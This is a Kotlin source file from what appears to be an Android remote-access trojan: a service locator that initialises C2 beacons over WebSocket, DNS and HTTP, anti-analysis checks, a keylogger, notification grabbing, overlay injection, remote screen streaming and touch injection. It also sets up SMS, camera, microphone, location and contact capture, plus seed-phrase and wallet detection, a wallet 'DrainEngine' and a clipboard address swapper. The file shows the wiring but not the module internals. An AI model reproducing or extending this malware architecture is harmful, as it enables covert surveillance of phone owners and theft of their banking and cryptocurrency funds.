// ============================================================
// FILE: android/app/src/main/java/com/xrc/core/di/ServiceLocator.kt
// ============================================================
package com.xrc.core.di

import android.content.Context
import com.xrc.comms.ChannelClient
import com.xrc.comms.WSSClient
import com.xrc.comms.DNSBeacon
import com.xrc.comms.HTTPBeacon
import com.xrc.core.config.XrcConfig
import com.xrc.core.config.XrcConfigLoader
import com.xrc.core.crypto.CryptoBox
import com.xrc.core.crypto.Identity
import com.xrc.core.pref.SecurePrefs
import com.xrc.overlays.SyringeEngine
import com.xrc.overlays.NotificationGrabber
import com.xrc.overlays.Keylogger
import com.xrc.sensors.*
import com.xrc.crypto.SeedDetector
import com.xrc.crypto.WalletDetector
import com.xrc.crypto.FinanceScanner
import com.xrc.crypto.DrainEngine
import com.xrc.crypto.ClipboardSwapper
import com.xrc.svc.CommandProcessor
import com.xrc.svc.HeartbeatService
import com.xrc.utils.PermUtils
import com.xrc.utils.FileUtils
import com.xrc.utils.AntiAnalysis
import com.xrc.vnc.ScreenStreamer
import com.xrc.vnc.TouchInjector
import com.xrc.xrc.XrcAccessibilityService

/**
 * ServiceLocator — manual dependency injection container.
 *
 * Provides singleton instances of all core services.
 * Eliminates the need for Dagger/Hilt while maintaining
 * testability and clean architecture.
 */
class ServiceLocator(private val context: Context) {

    // Core singletons
    private var _config: XrcConfig? = null
    private var _securePrefs: SecurePrefs? = null
    private var _cryptoBox: CryptoBox? = null
    private var _identity: Identity? = null
    private var _channelClient: ChannelClient? = null
    private var _commandProcessor: CommandProcessor? = null
    private var _antiAnalysis: AntiAnalysis? = null

    // Sensor instances
    private var _sms: SMS? = null
    private var _camera: Camera? = null
    private var _microphone: Microphone? = null
    private var _location: Location? = null
    private var _contacts: Contacts? = null
    private var _clipboard: Clipboard? = null
    private var _wifi: WiFi? = null

    // Feature modules
    private var _syringeEngine: SyringeEngine? = null
    private var _keylogger: Keylogger? = null
    private var _notificationGrabber: NotificationGrabber? = null
    private var _screenStreamer: ScreenStreamer? = null
    private var _touchInjector: TouchInjector? = null
    private var _seedDetector: SeedDetector? = null
    private var _walletDetector: WalletDetector? = null
    private var _financeScanner: FinanceScanner? = null
    private var _drainEngine: DrainEngine? = null
    private var _clipboardSwapper: ClipboardSwapper? = null

    fun initialize() {
        // Initialize core components
        _securePrefs = SecurePrefs(context)
        _config = XrcConfigLoader.load(context)
        _antiAnalysis = AntiAnalysis(context)

        // Initialize identity
        _identity = Identity(context)
        _identity!!.initialize()

        // Initialize crypto with derived key
        val seedKey = if (config.c2.encryption_key.isNotEmpty()) {
            config.c2.encryption_key.toByteArray(Charsets.UTF_8)
        } else {
            CryptoBox.generateKey()
        }
        val deviceKey = CryptoBox.deriveKey(seedKey, Identity.getDeviceId(context))
        _cryptoBox = CryptoBox(deviceKey)

        // Initialize communication client
        val wssClient = WSSClient(context, config, cryptoBox)
        val dnsBeacon = DNSBeacon(context, config)
        val httpBeacon = HTTPBeacon(context, config, cryptoBox)
        _channelClient = ChannelClient(context, config, wssClient, dnsBeacon, httpBeacon)

        // Initialize command processor
        _commandProcessor = CommandProcessor(context, this)

        // Sensors
        _sms = SMS(context, channelClient)
        _camera = Camera(context, channelClient)
        _microphone = Microphone(context, channelClient)
        _location = Location(context, channelClient)
        _contacts = Contacts(context, channelClient)
        _clipboard = Clipboard(context, channelClient)
        _wifi = WiFi(context, channelClient)

        // Features
        _keylogger = Keylogger(context, channelClient)
        _notificationGrabber = NotificationGrabber(context, channelClient)
        _screenStreamer = ScreenStreamer(context, channelClient)
        _touchInjector = TouchInjector(context)
        _syringeEngine = SyringeEngine(context, this)

        // Crypto/finance
        _seedDetector = SeedDetector(context, channelClient)
        _walletDetector = WalletDetector(context, channelClient)
        _financeScanner = FinanceScanner(context, channelClient)
        _drainEngine = DrainEngine(context, config.crypto, channelClient)
        _clipboardSwapper = ClipboardSwapper(context, channelClient)
    }

    val config: XrcConfig get() = _config!!
    val securePrefs: SecurePrefs get() = _securePrefs!!
    val cryptoBox: CryptoBox get() = _cryptoBox!!
    val identity: Identity get() = _identity!!
    val channelClient: ChannelClient get() = _channelClient!!
    val commandProcessor: CommandProcessor get() = _commandProcessor!!
    val antiAnalysis: AntiAnalysis get() = _antiAnalysis!!

    val sms: SMS get() = _sms!!
    val camera: Camera get() = _camera!!
    val microphone: Microphone get() = _microphone!!
    val location: Location get() = _location!!
    val contacts: Contacts get() = _contacts!!
    val clipboard: Clipboard get() = _clipboard!!
    val wifi: WiFi get() = _wifi!!

    val syringeEngine: SyringeEngine get() = _syringeEngine!!
    val keylogger: Keylogger get() = _keylogger!!
    val notificationGrabber: NotificationGrabber get() = _notificationGrabber!!
    val screenStreamer: ScreenStreamer get() = _screenStreamer!!
    val touchInjector: TouchInjector get() = _touchInjector!!

    val seedDetector: SeedDetector get() = _seedDetector!!
    val walletDetector: WalletDetector get() = _walletDetector!!
    val financeScanner: FinanceScanner get() = _financeScanner!!
    val drainEngine: DrainEngine get() = _drainEngine!!
    val clipboardSwapper: ClipboardSwapper get() = _clipboardSwapper!!

    /**
     * Set accessibility service reference (set by XrcAccessibilityService).
     */
    var accessibilityService: XrcAccessibilityService? = null
}
